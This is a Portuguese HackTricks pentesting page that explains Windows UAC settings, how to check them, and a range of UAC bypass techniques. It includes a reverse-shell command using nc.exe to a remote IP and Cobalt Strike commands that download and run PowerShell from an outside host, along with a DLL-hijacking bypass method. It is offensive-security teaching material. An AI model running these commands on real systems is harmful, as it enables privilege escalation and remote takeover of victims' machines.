# UAC - Controle de Conta de Usuário

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

![](<../../.gitbook/assets/image (9) (1) (2).png>)

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** com as ferramentas comunitárias mais avançadas do mundo.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) é um recurso que permite um **prompt de consentimento para atividades elevadas**. As aplicações possuem diferentes níveis de `integridade`, e um programa com um **nível alto** pode realizar tarefas que **potencialmente comprometem o sistema**. Quando o UAC está ativado, as aplicações e tarefas sempre **rodam sob o contexto de segurança de uma conta de usuário não administrador**, a menos que um administrador autorize explicitamente essas aplicações/tarefas a terem acesso de nível de administrador para executar no sistema. É um recurso de conveniência que protege os administradores de alterações não intencionais, mas não é considerado uma barreira de segurança.

Para mais informações sobre os níveis de integridade:

{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
{% endcontent-ref %}

Quando o UAC está em vigor, um usuário administrador recebe 2 tokens: uma chave de usuário padrão, para realizar ações regulares como nível regular, e uma com privilégios de administrador.

Esta [página](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) discute como o UAC funciona em grande profundidade e inclui o processo de logon, experiência do usuário e arquitetura do UAC. Os administradores podem usar políticas de segurança para configurar como o UAC funciona especificamente para sua organização em nível local (usando secpol.msc), ou configurado e distribuído por meio de Objetos de Política de Grupo (GPO) em um ambiente de domínio Active Directory. As várias configurações são discutidas em detalhes [aqui](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Existem 10 configurações de Política de Grupo que podem ser definidas para o UAC. A tabela a seguir fornece detalhes adicionais:

| Configuração de Política de Grupo                                                                                                                                                                                                                                                                                                                                               | Chave do Registro            | Configuração Padrão                                          |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Modo de Aprovação do Administrador para a conta de Administrador integrada](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Desativado                                                   |
| [User Account Control: Permitir que aplicativos UIAccess solicitem elevação sem usar a área de trabalho segura](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Desativado                                                   |
| [User Account Control: Comportamento do prompt de elevação para administradores no Modo de Aprovação do Administrador](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Solicitar consentimento para binários não-Windows              |
| [User Account Control: Comportamento do prompt de elevação para usuários padrão](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Solicitar credenciais na área de trabalho segura               |
| [User Account Control: Detectar instalações de aplicativos e solicitar elevação](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Ativado (padrão para home) Desativado (padrão para empresas) |
| [User Account Control: Elevar apenas executáveis que são assinados e validados](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Desativado                                                   |
| [User Account Control: Elevar apenas aplicativos UIAccess que estão instalados em locais seguros](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Ativado                                                      |
| [User Account Control: Executar todos os administradores no Modo de Aprovação do Administrador](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Ativado                                                      |
| [User Account Control: Alternar para a área de trabalho segura ao solicitar elevação](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Ativado                                                      |
| [Controle de Conta de Usuário: Virtualizar falhas de gravação de arquivos e registros em locais específicos para cada usuário](https://docs.microsoft.com/pt-br/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Habilitado                                                      |

### Teoria de Bypass do UAC

Alguns programas são **automaticamente autoelevados** se o **usuário pertencer** ao **grupo de administradores**. Esses binários possuem em seus _**Manifestos**_ a opção _**autoElevate**_ com o valor _**True**_. O binário também precisa ser **assinado pela Microsoft**.

Portanto, para **burlar** o **UAC** (elevar do nível de integridade **médio** para **alto**), alguns atacantes usam esse tipo de binário para **executar código arbitrário**, pois ele será executado a partir de um processo de **alto nível de integridade**.

Você pode **verificar** o _**Manifesto**_ de um binário usando a ferramenta _**sigcheck.exe**_ do Sysinternals. E você pode **verificar** o **nível de integridade** dos processos usando o _Process Explorer_ ou o _Process Monitor_ (do Sysinternals).

### Verificar o UAC

Para confirmar se o UAC está habilitado, faça:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Se for **`1`**, o UAC está **ativado**, se for **`0`** ou **não existir**, então o UAC está **inativo**.

Em seguida, verifique **qual nível** está configurado:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
* Se **`0`**, então o UAC não será solicitado (como **desativado**)
* Se **`1`**, o administrador é **solicitado a fornecer nome de usuário e senha** para executar o binário com privilégios elevados (no Secure Desktop)
* Se **`2`** (**Sempre notificar-me**), o UAC sempre solicitará confirmação ao administrador quando ele tentar executar algo com privilégios elevados (no Secure Desktop)
* Se **`3`**, é como `1`, mas não é necessário no Secure Desktop
* Se **`4`**, é como `2`, mas não é necessário no Secure Desktop
* Se **`5`** (**padrão**), ele solicitará ao administrador a confirmação para executar binários não Windows com privilégios elevados

Em seguida, você deve verificar o valor de **`LocalAccountTokenFilterPolicy`**\
Se o valor for **`0`**, então apenas o usuário RID 500 (**Administrador integrado**) poderá realizar tarefas de administrador sem o UAC, e se for `1`, todas as contas dentro do grupo "Administradores" podem fazê-lo.

E, finalmente, verifique o valor da chave **`FilterAdministratorToken`**\
Se for **`0`** (padrão), a conta **Administrador integrado pode** realizar tarefas de administração remota e se for **`1`**, a conta integrada Administrador **não pode** realizar tarefas de administração remota, a menos que `LocalAccountTokenFilterPolicy` esteja definido como `1`.

#### Resumo

* Se `EnableLUA=0` ou **não existir**, **nenhum UAC para ninguém**
* Se `EnableLua=1` e **`LocalAccountTokenFilterPolicy=1` , nenhum UAC para ninguém**
* Se `EnableLua=1` e **`LocalAccountTokenFilterPolicy=0` e `FilterAdministratorToken=0`, nenhum UAC para RID 500 (Administrador integrado)**
* Se `EnableLua=1` e **`LocalAccountTokenFilterPolicy=0` e `FilterAdministratorToken=1`, UAC para todos**

Todas essas informações podem ser obtidas usando o módulo **metasploit**: `post/windows/gather/win_privs`

Você também pode verificar os grupos do seu usuário e obter o nível de integridade:
```
net user %username%
whoami /groups | findstr Level
```
## Bypass do UAC

{% hint style="info" %}
Observe que se você tiver acesso gráfico à vítima, o bypass do UAC é simples, pois você pode simplesmente clicar em "Sim" quando a solicitação do UAC aparecer.
{% endhint %}

O bypass do UAC é necessário na seguinte situação: **o UAC está ativado, seu processo está sendo executado em um contexto de integridade média e seu usuário pertence ao grupo de administradores**.

É importante mencionar que é **muito mais difícil fazer o bypass do UAC se ele estiver no nível de segurança mais alto (Sempre) do que se estiver em qualquer um dos outros níveis (Padrão).**

### UAC desativado

Se o UAC já estiver desativado (`ConsentPromptBehaviorAdmin` é **`0`**), você pode **executar um shell reverso com privilégios de administrador** (nível de integridade alto) usando algo como:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### Bypass do UAC com duplicação de token

* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Muito** básico "bypass" do UAC (acesso completo ao sistema de arquivos)

Se você tiver um shell com um usuário que está dentro do grupo Administradores, você pode **montar o compartilhamento C$** via SMB (sistema de arquivos) localmente em um novo disco e terá **acesso a tudo dentro do sistema de arquivos** (inclusive a pasta home do Administrador).

{% hint style="warning" %}
**Parece que esse truque não funciona mais**
{% endhint %}
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### Bypass do UAC com o Cobalt Strike

As técnicas do Cobalt Strike só funcionarão se o UAC não estiver configurado no nível máximo de segurança.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** e **Metasploit** também possuem vários módulos para **burlar** o **UAC**.

### KRBUACBypass

Documentação e ferramenta em [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Explorações de bypass do UAC

[**UACME**](https://github.com/hfiref0x/UACME) é uma **compilação** de várias explorações de bypass do UAC. Note que você precisará **compilar o UACME usando o Visual Studio ou o MSBuild**. A compilação criará vários executáveis (como `Source\Akagi\outout\x64\Debug\Akagi.exe`), você precisará saber **qual você precisa**.\
Você deve **ter cuidado**, pois alguns bypasses irão **solicitar que outros programas** alertem o **usuário** de que algo está acontecendo.

O UACME possui a **versão de compilação a partir da qual cada técnica começou a funcionar**. Você pode procurar por uma técnica que afete suas versões:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Além disso, usando [esta](https://en.wikipedia.org/wiki/Windows\_10\_version\_history) página, você obtém a versão do Windows `1607` a partir das versões de compilação.

#### Mais bypass do UAC

**Todas** as técnicas usadas aqui para contornar o UAC **exigem** um **shell interativo completo** com a vítima (um shell nc.exe comum não é suficiente).

Você pode obter usando uma sessão **meterpreter**. Migrar para um **processo** que tenha o valor **Session** igual a **1**:

![](<../../.gitbook/assets/image (96).png>)

(_explorer.exe_ deve funcionar)

### Bypass do UAC com GUI

Se você tiver acesso a uma **GUI, pode simplesmente aceitar o prompt do UAC** quando o receber, você realmente não precisa de um bypass. Portanto, ter acesso a uma GUI permitirá que você contorne o UAC.

Além disso, se você obtiver uma sessão GUI que alguém estava usando (potencialmente via RDP), existem **algumas ferramentas que serão executadas como administrador** de onde você pode **executar** um **cmd**, por exemplo, **como administrador** diretamente sem ser solicitado novamente pelo UAC, como [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Isso pode ser um pouco mais **furtivo**.

### Bypass barulhento do UAC por força bruta

Se você não se importa em fazer barulho, você sempre pode **executar algo como** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) que **pede para elevar as permissões até que o usuário aceite**.

### Seu próprio bypass - Metodologia básica de bypass do UAC

Se você der uma olhada no **UACME**, você notará que **a maioria dos bypasses do UAC abusa de uma vulnerabilidade de Dll Hijacking** (principalmente escrevendo a dll maliciosa em _C:\Windows\System32_). [Leia isso para aprender como encontrar uma vulnerabilidade de Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking.md).

1. Encontre um binário que será **autoelevado** (verifique se, quando ele é executado, ele é executado em um nível de integridade alto).
2. Com o procmon, encontre eventos "**NAME NOT FOUND**" que podem ser vulneráveis ao **Dll Hijacking**.
3. Provavelmente, você precisará **escrever** a DLL em alguns **caminhos protegidos** (como C:\Windows\System32), onde você não tem permissões de gravação. Você pode contornar isso usando:
1. **wusa.exe**: Windows 7, 8 e 8.1. Ele permite extrair o conteúdo de um arquivo CAB em caminhos protegidos (porque essa ferramenta é executada em um nível de integridade alto).
2. **IFileOperation**: Windows 10.
4. Prepare um **script** para copiar sua DLL para dentro do caminho protegido e executar o binário vulnerável e autoelevado.

### Outra técnica de bypass do UAC

Consiste em observar se um binário **autoelevado** tenta **ler** do **registro** o **nome/caminho** de um **binário** ou **comando** a ser **executado** (isso é mais interessante se o binário procurar essas informações dentro do **HKCU**).

![](<../../.gitbook/assets/image (9) (1) (2).png>)

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para criar e **automatizar fluxos de trabalho** com as ferramentas comunitárias mais avançadas do mundo.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? Ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
